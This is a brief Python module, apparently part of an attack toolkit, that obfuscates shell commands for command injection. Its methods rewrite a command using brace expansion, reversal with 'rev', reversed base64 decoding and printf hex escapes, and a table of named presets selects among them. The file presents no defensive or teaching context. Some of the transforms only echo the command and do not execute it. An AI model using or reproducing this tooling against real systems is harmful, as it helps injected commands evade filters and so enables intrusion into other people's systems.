"""
Advanced Command Injection Obfuscation Module
"""

import base64


class AdvancedObfuscator:

    @staticmethod
    def brace_expand_basic(command):
        parts = command.split(" ")
        return "{" + ",".join(parts) + "}"

    @staticmethod
    def reverse_with_rev(command):
        reversed_cmd = command[::-1]
        return f"rev<<<'{reversed_cmd}'"

    @staticmethod
    def reverse_base64_combo(command):
        reversed_cmd = command[::-1]
        encoded = base64.b64encode(reversed_cmd.encode()).decode()
        return f"echo {encoded} | base64 -d | rev"

    @staticmethod
    def ascii_to_char_basic(command):
        return "$(printf \"" + ''.join([f"\\x{ord(c):02x}" for c in command]) + "\")"


ADVANCED_PRESETS = {
    'brace': 'brace_expand_basic',
    'reverse': 'reverse_with_rev',
    'reverse_base64': 'reverse_base64_combo',
    'ascii': 'ascii_to_char_basic'
}
